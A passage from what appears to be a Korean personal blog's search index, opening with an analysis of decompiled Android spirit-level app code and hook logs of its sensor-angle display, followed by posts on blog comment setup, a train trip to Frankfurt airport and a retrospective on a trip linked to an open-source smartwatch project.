onSensorChanged(SensorEvent sensorEvent0) { float f; j j0 = this.e; j0.getClass(); this.a = (float[])sensorEvent0.values.clone(); if(j0.f) { this.c = this.a[1] - j0.g; f = this.a[2] - j0.h; } else { float[] arr_f = this.a; float f1 = arr_f[0]; if((f1 &lt;= -9.80665f)) { arr_f[0] = -9.806641f; } else if((f1 &gt;= 9.80665f)) { arr_f[0] = 9.806641f; } float f2 = arr_f[1]; if((f2 &lt;= -9.80665f)) { arr_f[1] = -9.806641f; } else if((f2 &gt;= 9.80665f)) { arr_f[1] = 9.806641f; } this.c = 90.0f - ((float)(Math.acos(-arr_f[1] / 9.80665f) / 3.141593 * 180.0)) - j0.g; this.b = 90.0f - ((float)(Math.acos(this.a[0] / 9.80665f) / 3.141593 * 180.0)) - j0.h; this.c = this.d[0].a(this.c); f = this.d[1].a(this.b); } this.b = f; if(((this.c &gt; -0.08f)) &amp;&amp; ((this.c &lt; 0.08f))) { this.c = 0.0f; } if(((this.b &gt; -0.08f)) &amp;&amp; ((this.b &lt; 0.08f))) { this.b = 0.0f; } j0.e.f(this.c, this.b); j0.e.postInvalidate(); }}센서 값에 대하여 위 코드를 통해 j0.e.f() 로 진입한다.protected final void f(float f, float f1) { float f2; if(this.l) { return; } if(SmartLevel.s) { if(this.w) { goto label_11; } this.g = -f; f2 = -f1; } else { if(this.w) { this.g = f; this.h = f1; return; } label_11: this.g = f1; f2 = -f; } this.h = f2;}위에 코드를 보면 this.g 에 특정 값이 대입된다.@Override // android.view.Viewpublic final void onDraw(Canvas canvas0) { float f59; float f58; float f49; float f20; float f19; float f18; float f17; float f = 0.0f; if(this.D) { this.A = this.getWidth(); int v = this.getHeight(); this.B = v; this.w = this.A &gt; v; this.C = Math.max(1.0f, this.e.getResources().getDisplayMetrics().density - 0.5f); int v1 = v.c(this.e, this.w); if((SmartLevel.r &gt; 1.0f)) { int v2 = Math.max(this.A, this.B); if(this.w) { v1 = 0; } this.E = ((float)(v2 + v1)) / SmartLevel.r; } if(this.z == 0) { this.z = v.e(this.e, SmartLevel.H, this.w); } float f1 = SmartLevel.r; if(((f1 &gt; 150.0f)) &amp;&amp; ((f1 &lt;= 170.0f))) { this.c = 1.35f; } else if(((f1 &gt; 170.0f)) || (SmartLevel.s) &amp;&amp; (((SmartLevel.r &gt; 150.0f)) || ((SmartLevel.r &lt; 0.0f)))) { this.c = 1.7f; } float f2 = this.E * 3.0f * this.c; this.F = f2; float f3 = (float)this.z; this.G = f3; int v3 = SmartLevel.v; if(v3 == 0xFF000000) { this.u = -1; this.v = -12303292; } else if(v3 == 0xFF6B6B6B) { this.v = 0xFF9E9E9E; } if(this.w) { float f4 = (((float)this.B) - f3 - ((float)this.t) - f2 * 3.0f) / 2.0f; this.p = f4; this.j = ((float)this.A) / 2.0f; this.k = f2 * 2.0f + ((float)this.t) + f4; } else { float f5 = (((float)(this.A - this.t)) - f2 * 3.0f) / 2.0f; this.p = f5; this.j = f2 * 2.0f + ((float)this.t) + f5; this.k = (((float)this.B) - f3) / 2.0f + f2 * 1.7f; float f6 = ((float)this.t) * 3.7f; if((f5 &gt; f6)) { this.p = f6; } } this.r.reset(); int v4 = this.w ? 1 : 2; float f7 = this.j - this.p; float f8 = this.F * ((float)v4); this.s.set(f7 - 1.0f, f8, f7 + ((float)this.t) - 1.0f, ((float)this.t) + f8); this.r.addArc(this.s, 90.0f, 180.0f); this.r.lineTo(this.j + this.p - ((float)(this.t / 2)) + 1.0f, this.F * ((float)v4)); float f9 = this.j + this.p; float f10 = this.F * ((float)v4); this.s.set(f9 - ((float)this.t) + 1.0f, f10, f9 + 1.0f, ((float)this.t) + f10); this.r.addArc(this.s, 270.0f, 180.0f); this.r.lineTo(this.j - this.p + ((float)(this.t / 2)) - 1.0f, this.F * ((float)v4) + ((float)this.t)); this.q.reset(); int v5 = this.w ? 2 : 1; float f11 = this.F * ((float)v5); float f12 = this.k - this.p; this.s.set(f11 - 1.0f, f12, f11 + ((float)this.t) + 1.0f, ((float)this.t) + f12); this.q.addArc(this.s, 180.0f, 180.0f); this.q.lineTo(this.F * ((float)v5) + ((float)this.t) + 1.0f, this.k + this.p - ((float)(this.t / 2))); float f13 = this.F * ((float)v5); float f14 = this.k + this.p; this.s.set(f13 - 1.0f, f14 - ((float)this.t), f13 + ((float)this.t) + 1.0f, f14); this.q.addArc(this.s, 0.0f, 180.0f); this.q.lineTo(this.F * ((float)v5) - 1.0f, this.k - this.p + ((float)(this.t / 2))); this.d.setStyle(Paint.Style.FILL); this.D = false; } if(Math.abs(-this.g - 90.0f) &lt; 17.0f || Math.abs(-this.g - 90.0f) &gt; 50.0f) { this.a = Math.abs(-this.g - 90.0f) &lt; 17.0f; } float f15 = this.h; if((f15 &lt; 40.0f || f15 &gt; 73.0f) &amp;&amp; (f15 &lt; 107.0f || f15 &gt; 140.0f)) { this.b = ((f15 &gt; 73.0f)) &amp;&amp; ((f15 &lt; 107.0f)); } canvas0.drawColor(SmartLevel.v); this.d.setColor(SmartLevel.u); this.d.setColor(this.v); canvas0.drawPath(this.q, this.d); canvas0.drawPath(this.r, this.d); canvas0.drawCircle(this.j, this.k, this.p, this.d); this.d.setColor(this.u); this.d.setStyle(Paint.Style.STROKE); this.d.setStrokeWidth(this.C); canvas0.drawPath(this.q, this.d); canvas0.drawPath(this.r, this.d); canvas0.drawCircle(this.j, this.k, this.p, this.d); this.d.setStrokeWidth(Math.max(1.0f, this.C - 0.5f)); float f16 = this.p; int v6 = this.t; if((f16 &gt; ((float)v6) * 2.5f)) { canvas0.drawCircle(this.j, this.k, f16 * 2.0f / 3.0f + ((float)(v6 / 6)), this.d); canvas0.drawCircle(this.j, this.k, this.p / 3.0f + ((float)(this.t / 3)), this.d); f17 = this.j; f18 = this.k; f19 = (float)this.t; f20 = 1.9f; } else { canvas0.drawCircle(this.j, this.k, f16 / 2.0f + ((float)(v6 / 4)), this.d); f17 = this.j; f18 = this.k; f19 = (float)this.t; f20 = 1.95f; } canvas0.drawCircle(f17, f18, f19 / f20, this.d); this.d.setStyle(Paint.Style.FILL); this.d.setStrokeWidth(Math.max(1.0f, this.C - 1.0f)); canvas0.drawLine(this.j, this.F * ((float)(this.w ? 1 : 2)) + ((float)this.t), this.j, this.k + this.p, this.d); canvas0.drawLine(((float)this.t) + this.F * ((float)(this.w ? 2 : 1)), this.k, this.j + this.p, this.k, this.d); this.d.setStrokeWidth(0.0f); int v7 = this.w ? 1 : 2; float f21 = this.j - ((float)(this.t / 2)) - this.C * 2.0f; float f22 = this.F * ((float)v7); canvas0.drawLine(f21, f22, f21, f22 + ((float)this.t), this.d); float f23 = this.j - ((float)(this.t / 2)) - this.C * 5.0f; float f24 = this.F * ((float)v7); canvas0.drawLine(f23, f24, f23, f24 + ((float)this.t), this.d); float f25 = this.C * 2.0f + (((float)(this.t / 2)) + this.j); float f26 = this.F * ((float)v7); canvas0.drawLine(f25, f26, f25, f26 + ((float)this.t), this.d); float f27 = this.C * 5.0f + (((float)(this.t / 2)) + this.j); float f28 = this.F * ((float)v7); canvas0.drawLine(f27, f28, f27, f28 + ((float)this.t), this.d); int v8 = this.w ? 2 : 1; float f29 = this.F * ((float)v8); float f30 = this.k - ((float)(this.t / 2)) - this.C * 2.0f; canvas0.drawLine(f29, f30, ((float)this.t) + f29, f30, this.d); float f31 = this.F * ((float)v8); float f32 = this.k - ((float)(this.t / 2)) - this.C * 5.0f; canvas0.drawLine(f31, f32, ((float)this.t) + f31, f32, this.d); float f33 = this.F * ((float)v8); float f34 = this.C * 2.0f + (((float)(this.t / 2)) + this.k); canvas0.drawLine(f33, f34, ((float)this.t) + f33, f34, this.d); float f35 = this.F * ((float)v8); float f36 = this.C * 5.0f + (((float)(this.t / 2)) + this.k); canvas0.drawLine(f35, f36, ((float)this.t) + f35, f36, this.d); this.d.setColor(SmartLevel.u); this.d.setTextSize(this.E * 4.0f * this.c); if(this.w) { float f37 = this.k; canvas0.drawText(\"X\", this.E * this.c + (this.j + this.p), this.d.measureText(\"X\") / 2.0f + f37, this.d); canvas0.drawText(\"Y\", this.j - this.d.measureText(\"Y\") / 2.0f, this.F * 2.0f / 3.0f + (this.k + this.p), this.d); } else { float f38 = this.k; canvas0.drawText(\"X\", this.E * this.c * (this.p == ((float)this.t) * 3.8f ? 1.0f : -1.5f) + (this.j + this.p), this.d.measureText(\"X\") / 2.0f + f38, this.d); float f39 = this.j - this.d.measureText(\"Y\") / 2.0f; float f40 = this.k + this.p; float f41 = this.d.measureText(\"M\") + f40; canvas0.drawText(\"Y\", f39, this.E * this.c + f41, this.d); } float f42 = this.g; if((f42 &lt; -90.0f)) { this.g = -180.0f - f42; } else if((f42 &gt; 90.0f)) { this.g = 180.0f - f42; } this.d.setTextSize(((float)SmartLevel.t) * this.E * 3.0f / 5.0f * this.c); float f43 = this.d.measureText(\"M\"); float f44 = this.h; this.i = f44; if(SmartLevel.C) { if(((f44 &gt;= -270.0f)) &amp;&amp; ((f44 &lt;= -90.0f))) { this.i = SmartLevel.F * 2.0f + -(f44 + 180.0f); } if(((f44 &lt;= 270.0f)) &amp;&amp; ((f44 &gt;= 90.0f))) { this.i = SmartLevel.F * 2.0f + (180.0f - f44); } } if(this.a) { canvas0.save(); canvas0.rotate(-90.0f, this.F + ((float)this.t) + f43 / 2.0f, this.k - f43 / 2.0f); String s = \"Y = \" + LevelView.a(this.i); float f45 = this.E; float f46 = this.c; float f47 = 1.5f * f45 * f46 + (this.F + ((float)this.t)); float f48 = this.k; if(!this.w) { f43 = f45 * f46; } canvas0.drawText(s, f47, f48 + f43, this.d); canvas0.restore(); f49 = this.F; f = (float)(((double)(this.k - ((float)(this.t / 2)))) - Math.sin(Math.toRadians(this.i)) * ((double)this.p)); } else if(this.b) { canvas0.drawText(\"X = \" + LevelView.a(this.g), 1.5f * this.E * this.c + this.j, this.E * 0.5f * this.c + (this.F * ((float)(this.w ? 1 : 2)) + ((float)this.t) + f43), this.d); f49 = (float)(Math.sin(Math.toRadians(this.g)) * ((double)this.p) + ((double)(this.j - ((float)(this.t / 2))))); } else { if(this.w) { canvas0.drawText(\"X = \" + LevelView.a(this.g), this.E * 3.5f * this.c + (this.j + this.p), this.k - this.p + f43, this.d); canvas0.drawText(\"Y = \" + LevelView.a(this.i), 3.5f * this.E * this.c + (this.j + this.p), f43 * 2.0f + (this.k - this.p) + this.E, this.d); } else { canvas0.drawText(\"X = \" + LevelView.a(this.g), this.j - this.p, (this.F * 2.0f + ((float)this.t) + this.k - this.p) / 2.0f - this.E * 0.5f + 5.0f, this.d); canvas0.drawText(\"Y = \" + LevelView.a(this.i), this.j - this.p, this.E * 0.5f + (this.F * 2.0f + ((float)this.t) + this.k - this.p) / 2.0f + f43 + 5.0f, this.d); } f49 = (float)(Math.sin(Math.toRadians(this.g)) * ((double)this.p) + ((double)(this.j - ((float)(this.t / 2))))); float f50 = (float)(((double)(this.k - ((float)(this.t / 2)))) - Math.sin(Math.toRadians(this.i)) * ((double)this.p)); switch(SmartLevel.w) { case 1: case 3: { float f51 = this.i; if(f51 &gt;= 1.0f || f51 &lt;= -1.0f || (this.g &gt;= 1.0f || this.g &lt;= -1.0f)) { String s1 = LevelView.b(((float)Math.sqrt(f51 * f51 + this.g * this.g)), false); int v9 = (int)Math.toDegrees(Math.atan(this.i / this.g)); int v10 = this.g &gt;= 0.0f ? 90 - v9 : 270 - v9; float f52 = (float)(Math.sin(Math.toRadians(this.g)) * ((double)this.p)); float f53 = (float)(Math.sin(Math.toRadians(this.i)) * ((double)this.p)); float f54 = ((float)this.t) / 2.0f + ((float)Math.sqrt(f53 * f53 + f52 * f52)); this.d.setTextSize(((float)SmartLevel.t) * this.E * 3.0f / 6.5f * this.c); canvas0.save(); canvas0.rotate(((float)v10), this.j, this.k); canvas0.drawBitmap(this.o, this.j - ((float)(this.o.getWidth() / 3)), this.k - f54 - ((float)this.o.getHeight()), this.d); canvas0.drawText(s1 + \"\", this.j - this.d.measureText(s1) / 2.0f, this.k - f54 - ((float)this.o.getHeight()) / 0.9f, this.d); canvas0.restore(); } } } f = f50; } if(!this.a &amp;&amp; !this.b) { canvas0.drawBitmap(this.h(0), f49, f, this.d); } if(!this.a) { canvas0.drawBitmap(this.h(2), f49, this.F * ((float)(this.w ? 1 : 2)), this.d); } if(!this.b) { canvas0.drawBitmap(this.h(1), this.F * ((float)(this.w ? 2 : 1)), f, this.d); } if(SmartLevel.z) { this.d.setTextSize(this.E * 1.6f * this.c); this.d.setColor(0xFF888888); canvas0.drawBitmap(this.m, ((float)this.A) - this.F / 2.0f - ((float)this.m.getWidth()), ((float)this.B) - this.G - this.F - ((float)this.m.getHeight()) - this.E * 0.5f, this.d); String s2 = this.e.getString(0x7F1100CF); // string:roll_zero \"Zero calibration\" float f55 = this.d.measureText(this.e.getString(0x7F1100CF)); // string:roll_zero \"Zero calibration\" float f56 = (float)this.m.getWidth(); float f57 = this.F / 2.0f; if((f55 &gt; f56 + f57)) { f58 = (float)this.A; f59 = this.d.measureText(this.e.getString(0x7F1100CF)); // string:roll_zero \"Zero calibration\" } else { f58 = ((float)this.A) - f57; float f60 = (float)this.m.getWidth(); f59 = (this.d.measureText(this.e.getString(0x7F1100CF)) + f60) / 2.0f; // string:roll_zero \"Zero calibration\" } canvas0.drawText(s2, f58 - f59, this.E * 1.0f + (((float)this.B) - this.G - this.F), this.d); } if((this.l) &amp;&amp; System.currentTimeMillis() / 500L % 2L == 0L) { this.d.setTextSize(this.E * 5.0f * this.c); this.d.setColor(0xFFFF0000); canvas0.drawText(this.e.getString(0x7F110063), (((float)this.A) - this.d.measureText(this.e.getString(0x7F110063))) / 2.0f, ((float)this.B) / 2.1f, this.d); // string:holding \"Holding …\" }}위에서 보면 canvas0.drawText(\"X = \" + LevelView.a(this.g),...) 매개변수에 센서 값을 출력하기 위해 this.g 를 전달하는 것을 볼 수 있다.private static String a(float f) { return SmartLevel.w == 3 ? LevelView.b(f, false) : LevelView.b(f, true);}위 함수로 들어간다.아래 함수를 통해서 문자열을 정리 후 필터링한다.private static String b(float f, boolean z) { String s2; StringBuilder stringBuilder2; int v = SmartLevel.w; String s = \"\"; if(v == 0) { StringBuilder stringBuilder0 = new StringBuilder(); stringBuilder0.append(v.a.format(((double)f))); if(z) { s = \"˚\"; } stringBuilder0.append(s); return stringBuilder0.toString(); } switch(v) { case 1: { double f4 = Math.tan(Math.toRadians(f)) * 100.0; if(f4 &gt;= -1000.0 &amp;&amp; f4 &lt;= 1000.0) { if(f4 &gt; -10.0 &amp;&amp; f4 &lt; 10.0) { if(((f4 &gt; -0.4)) &amp;&amp; ((f4 &lt; 0.4))) { f4 = 0.0; } StringBuilder stringBuilder3 = new StringBuilder(); stringBuilder3.append(v.a.format(f4)); if(z) { s = \" %\"; } stringBuilder3.append(s); return stringBuilder3.toString(); } StringBuilder stringBuilder4 = new StringBuilder(); stringBuilder4.append(((int)f4)); if(z) { s = \" %\"; } stringBuilder4.append(s); return stringBuilder4.toString(); } return \"∞\"; } case 2: { break; } default: { float f1 = (float)(Math.tan(Math.toRadians(f)) * 12.0); if(((f &lt; -89.0f &amp;&amp; f &lt; -91.0f)) || ((f &gt; 89.0f)) &amp;&amp; ((f &lt; 91.0f))) { return \"∞\"; } StringBuilder stringBuilder1 = new StringBuilder(); float f2 = Math.abs(f1); String s1 = ((int)f2) &lt;= 0 ? \"0\" : Integer.toString(((int)f2)); float f3 = f2 - ((float)(((int)f2))); if(((f3 &gt; 0.0625f)) &amp;&amp; ((f3 &lt;= 0.1875f))) { stringBuilder2 = a.k(s1); s2 = \"⅛\"; stringBuilder2.append(s2); s1 = stringBuilder2.toString(); } else { if(((f3 &gt; 0.1875f)) &amp;&amp; ((f3 &lt;= 0.3125f))) { stringBuilder2 = a.k(s1); s2 = \"¼\"; stringBuilder2.append(s2); s1 = stringBuilder2.toString(); goto label_50; } if(((f3 &gt; 0.3125f)) &amp;&amp; ((f3 &lt;= 0.4375f))) { stringBuilder2 = a.k(s1); s2 = \"⅜\"; stringBuilder2.append(s2); s1 = stringBuilder2.toString(); goto label_50; } if(((f3 &gt; 0.4375f)) &amp;&amp; ((f3 &lt;= 0.5625f))) { stringBuilder2 = a.k(s1); s2 = \"½\"; stringBuilder2.append(s2); s1 = stringBuilder2.toString(); goto label_50; } if(((f3 &gt; 0.5625f)) &amp;&amp; ((f3 &lt;= 0.6875f))) { stringBuilder2 = a.k(s1); s2 = \"⅝\"; stringBuilder2.append(s2); s1 = stringBuilder2.toString(); goto label_50; } if(((f3 &gt; 0.6875f)) &amp;&amp; ((f3 &lt;= 0.8125f))) { stringBuilder2 = a.k(s1); s2 = \"¾\"; stringBuilder2.append(s2); s1 = stringBuilder2.toString(); goto label_50; } if(((f3 &gt; 0.8125f)) &amp;&amp; ((f3 &lt;= 0.9375f))) { stringBuilder2 = a.k(s1); s2 = \"⅞\"; stringBuilder2.append(s2); s1 = stringBuilder2.toString(); goto label_50; } if((f3 &gt;= 0.9375f)) { s1 = Integer.toString(((int)f2) + 1); } } label_50: stringBuilder1.append(s1); if(z) { s = \"/12\\\"\"; } stringBuilder1.append(s); return stringBuilder1.toString(); } } StringBuilder stringBuilder5 = new StringBuilder(); stringBuilder5.append(v.b.format(Math.toRadians(f))); if(z) { s = \" rad\"; } stringBuilder5.append(s); return stringBuilder5.toString();}실제로 값이 그렇게 나오는지 확인해본다.[+] Logger for level.sample.app.LevelView.a(f) param=-38.5569953918457[+] Logger for level.sample.app.LevelView.a(f) result=-38.6˚[+] Logger for level.sample.app.LevelView.a(f) param=16.77606773376465[+] Logger for level.sample.app.LevelView.a(f) result=16.8˚[+] Logger for level.sample.app.LevelView.a(f) param=-38.5569953918457[+] Logger for level.sample.app.LevelView.a(f) result=-38.6˚[+] Logger for level.sample.app.LevelView.a(f) param=16.77606773376465[+] Logger for level.sample.app.LevelView.a(f) result=16.8˚[+] Logger for level.sample.app.LevelView.a(f) param=-38.5569953918457[+] Logger for level.sample.app.LevelView.a(f) result=-38.6˚[+] Logger for level.sample.app.LevelView.a(f) param=16.77606773376465[+] Logger for level.sample.app.LevelView.a(f) result=16.8˚[+] Logger for level.sample.app.LevelView.a(f) param=-38.5569953918457[+] Logger for level.sample.app.LevelView.a(f) result=-38.6˚[+] Logger for level.sample.app.LevelView.a(f) param=16.77606773376465[+] Logger for level.sample.app.LevelView.a(f) result=16.8˚위와 같이 현재 AVD Gyro 센서 값을 출력하는 것을 볼 수 있다아래와 같이 Virtual 환경에서 Gyro 센서 값을 조절하면 해당 함수를 통해 값을 출력하는 것을 확인할 수 있다.정리하며해당 앱은 하드웨어를 통해 얻은 라이브한 센서 값을 얻는다. 그 후 보정하는 단계를 거치게 되는데 이때 인간이 이해하기 쉽게 시각화하느라 코드 전반에 계산식이 내포된다. 이로 인한 과정이 있어서 분석이 조금 어려웠다." }, { "title": "블로그에 댓글 기능 활성화하기", "url": "/posts/how-to-enable-comment/", "categories": "diary, blog", "tags": "diary, blog", "date": "2023-10-22 00:00:00 +0900", "snippet": "Step by step다음 url 로 접근하여 댓글이 게시될 때 알려줄 공개저장소를 등록해준다.utterances: repo: RuffaloLavoisier/ruffalolavoisier.github.io # &lt;gh-username&gt;/&lt;repo&gt; issue_term: pathname # &lt; url | pathname | ...", "content": "Step by step다음 url 로 접근하여 댓글이 게시될 때 알려줄 공개저장소를 등록해준다.utterances: repo: RuffaloLavoisier/ruffalolavoisier.github.io # &lt;gh-username&gt;/&lt;repo&gt; issue_term: pathname # &lt; url | pathname | title | ...&gt;나머지는 다 default 로 하고 로컬 블로그 저장소에서 기재한 댓글 이슈가 달릴 저장소 이름만 동일하게 기재해주면 된다." }, { "title": "오스나부르크에서 프랑크푸르트 공항가기", "url": "/posts/go-to-airport-from-osnabrk/", "categories": "travel", "tags": "travel", "date": "2023-10-09 00:00:00 +0900", "snippet": "오스나부르크에서 프랑크푸르트 공항가기한국에서 여기까지 오는 시간은 13시간하고 기차 3시간 30분 하고 또 걸렸다.다시 한국으로 돌아갈 시간이다.빠진 것은 없는지 살펴보는데 기차역에서 플랫폼을 찾아서 기차를 타고 공항역으로 가서 공항에서 탑승수속을 마치는 것까지 살짝 긴장했다. 올 때는 동행자와 같이 와서 그냥 가는데로 따라갔지만 다시 돌아올때는 나 ...", "content": "오스나부르크에서 프랑크푸르트 공항가기한국에서 여기까지 오는 시간은 13시간하고 기차 3시간 30분 하고 또 걸렸다.다시 한국으로 돌아갈 시간이다.빠진 것은 없는지 살펴보는데 기차역에서 플랫폼을 찾아서 기차를 타고 공항역으로 가서 공항에서 탑승수속을 마치는 것까지 살짝 긴장했다. 올 때는 동행자와 같이 와서 그냥 가는데로 따라갔지만 다시 돌아올때는 나 혼자 가는 것이라 여유 시간도 충분히 배치해서 공항과 기차역 사이에서 차분하게 가려고 했다.이따가 3시간 뒤에 일어나서 기차역을 가야한다. 이 날은 VR 게임을 했는데 마지막 날 재밌는 걸 해서 매우 아쉬운 감이 있었다.친구가 기차역까지 데려다준다고 한다. 어떻게 여기까지 올 수 있을까마지막으로 친구가 데려다주고 바라볼 때 살짝 눈물이 핑 돌았다. 지난 2년의 시간이 지나갔다. 7 -segment 로 시계를 만들다가 다른 프로젝트를 알아보던 중 정말 정교하게 만들어진 스마트워치를 발견했다. 꾸준한 컨트리뷰션으로 여기까지 왔으니..아주 의미 있는 여행이었다. 사실은 작년에 여행을 오려고 했는데 코로나가 심해서 그러지 못했다.올해는 꼭 가야지 마음 먹고 왔는데역에 도착했다. 여기로 올 때 이 역을 처음 봤을 때는 너무 피곤했는데 이렇게 또 보니까 색다른 느낌이 든다.열차 전광판을 보면서 내가 탈 기차를 기다린다.플랫폼 2로 간다.앞에 보이는 숫자 2로 올라가면 된다.여기서 기차 번호를 기다리면 된다.기다리면서 2층 기차도 구경할 수 있었다.옆에 전광판에 쓰여진 기차 이름을 보고 탄다.내가 탈 기차다.3시간 정도를 달려간다.좀 놓친 게 있다면 내 자리 좌석을 찾기 어려웠다는 것이다. 멘붕도 잠시.. 지나가던 독일분이 영어를 할 줄 아셔서 좌석 찾는 법을 여쭤봤고 내 자리를 찾아갈 수 있었다.도착하기 한 정거장 전에 보인 건물인데 찍었다.도착했다.나는 비행기를 터미널 1에서 타니까 그쪽으로 가야한다.에스컬레이터를 타고 올라오면 이런 곳이 있다.길고 긴 화살표를 따라 쭉 간다.이곳에서 탑승수속을 밟으면 된다.미리 온라인 체크인한 QR 코드를 저 기계에 터치한다.그럼 이런 익숙한 수하물 스티커가 나온다.본격적으로 수하물 맡기는 기계로 가서 수하물을 올려놓고 확인 확인 누르면 가방을 보낸다.잘 된 것이다.아침 일찍 나오느라 끼니를 안 챙겨 먹었는데 공항에서 먹은 빵이다.빵이 딱딱한 건 익숙했는데 진짜 돌을 씹는 기분이었다. 손으로 뜯어먹었다..빵의 강도는 바위 이상…;;뱅기가 지연되긴 했는데 그래도 기다리면서 경치를 담았다.인천으로 가는 비행기 게이트 앞에 하나줄 한국인드리 모여들면서 진짜 이제 집에 가는게 실감되면서 또 연휴 때 와서 그런지 많은 사람들이 보였다.자리는 이곳에 탔다. 다리를 쭉 뻗을 수 있을줄 알았는데 그외에는 정말 …두번 다시는 이곳에 안 탈거 같다.산만하고 시끄럽고…최악의 자리였다.긴 비행동안 블로그를 정리했다. 지난 시간동안 있었던 일들을 정리하고 조금씩 끄적였다.계속 앉아있으면 허리 박살난다.주기적으로 화장실도 다녀오고 뒤에서 서있었다.근데 확실히 직항이 좋은걸까경유를 탔을 때는 한번에 가지 않지만 좀 환기가 되는 기분이 있다. 하지만 낯선 경유지에서 다른 비행기를 갈아타야 한다는 점도 있다.그래도 영어만 된다면 … 큰 문제는 없다고 생각한다.이번에 버터 바르는 방법을 배웠다.칼로 버터를 살살 긁는 것부터 빵에 평평하게 바르는 것까지 .. 정석으로 배웠다.이 초코릿 바 취저다. 입에도 안 묻고 입 안에도 안 묻는 신기한 초코릿 바이다.도착했다.한국이 최고다.집으로 가는 공항버스를 기다리는데 피곤한 건 둘째치고 여러가지 재밌는 기억들이 지나간다.집에 가서 라면에 샤워라도 하고싶은 마음이다." }, { "title": "독일 && 네덜란드 회고", "url": "/posts/for-OSW/", "categories": "develop-diary, travel", "tags": "travel", "date": "2023-09-29 00:00:00 +0900", "snippet": "몇년만인지한창 여행하고 싶을 때 코로나 바이러스가 유행하며 하늘 길이 닫히고 여러 여행사와 항공사들은 한파를 겪게되었다.21년 여러 프로젝트를 구경하며 개인 프로젝트에 여러차례 기능 개선과 기능 구현을 시도했다. 졸업할 시기에 오픈소스 프로젝트에 전념하여 여러가지 프로젝트에 참여할 수 있었고 좋은 기회로 스마트워치 프로젝트에 메인테이너로 활동할 수 있...", "content": "몇년만인지한창 여행하고 싶을 때 코로나 바이러스가 유행하며 하늘 길이 닫히고 여러 여행사와 항공사들은 한파를 겪게되었다.21년 여러 프로젝트를 구경하며 개인 프로젝트에 여러차례 기능 개선과 기능 구현을 시도했다. 졸업할 시기에 오픈소스 프로젝트에 전념하여 여러가지 프로젝트에 참여할 수 있었고 좋은 기회로 스마트워치 프로젝트에 메인테이너로 활동할 수 있었다.처음 시작은 기술문서나 다국어 번역으로 접근하였고 프로젝트를 사용해보면서 개선점과 상승 기류를 만들어 점차 기여할 수 있었다. 가장 큰 기능 개선은 아마도 피트니스 워치페이스가 아니었을까 싶다. 만보기를 통해 나온 데이터로 칼로리와 거리를 분석해 그 날 운동한 히스토리를 사용자에게 다양한 UI 로 보여주는 방식이다. 이러한 애자일스러운 개발 방식으로 DevCall 을 주기적으로 가질 수 있었고 그 덕분에 다양한 테크니컬 기술들도 구경할 수 있었다.수차례 미팅을 하면서 main owner 가 있는 독일 이야기를 꺼냄으로 지금의 이야기를 시작할 수 있었다. 여행 계획은 사실 2022년에 계획했었다. 코로나 장기화가 되어 떠날까 하다가 1년을 미룬 계획이었다. 그래도 그 시간동안 더 준비와 얘기를 나눌 기회가 많았다. 이왕 가는 거 오래 머물 수 있도록 연휴를 이용해서 길게 갔다왔다. 전날 출발하기 전 짐을 챙길 때 선물로 줄 한국과자들과 컵누들을 챙겼다. 또 카메라 그리고 노트북을 챙겼는데 너무 필요 이상으로 짐을 챙기는 거 같기도 해서 살짝 걱정 반 기대 반 했다.근데 추후 말하겠지만 내가 입국할 때 이 친구들 역시 입국한다. 이 친구들도 내가 떠나기 전 2주 전 옆 나라 일본으로 여행을 왔다가 내가 떠나는 날 귀국행 비행기를 탄다는 것이다.덕분에 입국 후 이동하는 것은 순조롭게 이동할 수 있을 것이라 생각했다.준비물사진을 정리해보니 좀 뒤죽박죽인데 그래도 최대한 시간 순서대로 맞춰봤다. 이번에 느낀건데 가져가야 할 준비물은 항상 챙겨도 까먹는다. (맛있나..)챙기다 보니 다음 여행 때 참고할만한 것들을 체크하고자 한다.여기다 메모하여 다음 여행 때 참고하고자 한다. mindmap root((준비물)) 기본 여권 여권 복사본 가방 힙색 백팩 캐리어 전자기기 220V 전원 어댑터 노트북 노트북 충전기 폰 폰 충전기 카메라 카메라 충전기 e-paper 헤드폰 유/무선 USB 충전기 건강 상비약 타이레놀 감기약 복통약 데일밴드 마스크 날씨 우산 재정 현금 해외카드 2FA 체크카드 여행카드 통신사 로밍/USIM 옷 여벌 옷 속옷 상/하의 양말 아우터 일교차에 따른 겉옷 하의 취침 잠옷 기타 슬리퍼 모자 위생 세면도구 칫솔 치약 수건 바디워시 샴푸 물티슈 놓친 것이 있다면 감기약을 놓쳤다. 외국은 건강보험이 없어서 병원 가기 힘든데 타이레놀과 개인 상비약을 챙기면 아마 안심이 되지 않을까 싶다.드디어 긴 여정의 시작폰이랑 카메라랑 같이 찍어서 시간 순이 살짝 안 맞을 수 있는데 허허.. 이해바랍니다.버스를 기다리고 있는데 은근히 버스가 자주 늦게 온 전적이 있어서 예정 도착 시간보다 더 일찍 도착하는 버스를 예매했다.만약에 오후 5시 출발해서 공항에 오후 6시 도착하는 버스가 있다면 해당 버스는 오후 5시 30분에 온다고 생각하고 오후 4시 30 분에 출발하는 버스를 예매한 셈이다.연휴라 사람이 많아 탑승수속이 늦어질거 같아서 평소보다 4시간 전에 공항으로 가는 여정을 꾸렸다.공항에 도착했을 때 사람이 평시랑 비슷해서 다행이었다. 내가 탑승하는 항공사는 미리 온라인 체크인이 가능하여 모바일에서 체크인을 진행해서 공항 갔을 때 그냥 짐만 맡기고 티켓을 받았다. 뭐 …똑같은 거 같지만 돌아올 때 온라인 체크인를 한 것과 하지 않은 것은 눈에 띄게 차이가 있었다.밥 먹으러 올라가는 길인데 한식을 먹고 싶어서 찾다가 2층에 있는 음식점을 갔다. 제육 덮밥을 먹었는데 생각보다 매웠다. 가격이 12000원이었나 … ㅎㅋㅎㅋ탑승을 기다리고 있다. 1시간인가 2시간 전 도착해서 음악도 듣고 책도 읽고 했는데 비행기가 조금씩 딜레이되는 경향이 있었다. 그런데 30분정도라 괜찮았다.시간이 많이 남아서 공항을 구경할 수 있었다. 제 1 터미널은 많은 항공사가 있어서 진짜 넓었다.여기까지 이끌어준 가장 원초적인 사진 한 장 요약이 기능 패치를 실제로 써보는 날이 오다니..꽤 웅장했다.담요를 줬는데 밤 시간에 진짜 너무 추웠다. 잠을 자고 싶을 때 괜히 추워진다.충전이 되긴 하는데 음 .. 전압이 약해서 그런지 다른 기기가 연결되어있을 때 연결하면 충전이 안된다.. ㅋㅋㅋ 아무것도 연결하지 않고 콘센트를 꽂아야 파란불이 들어온다.비행기에서 스낵을 준다. 예상가는 그 맛이다.그냥 비스킷 느낌이다.중간에 밀린 독서도 했다.12시간이나 남았다.자고 일어나면 1시간 씩 줄어있었다. ㅋㅋㅋㅋ4번 자고 일어나니까 4시간이 줄어있었다.기내식 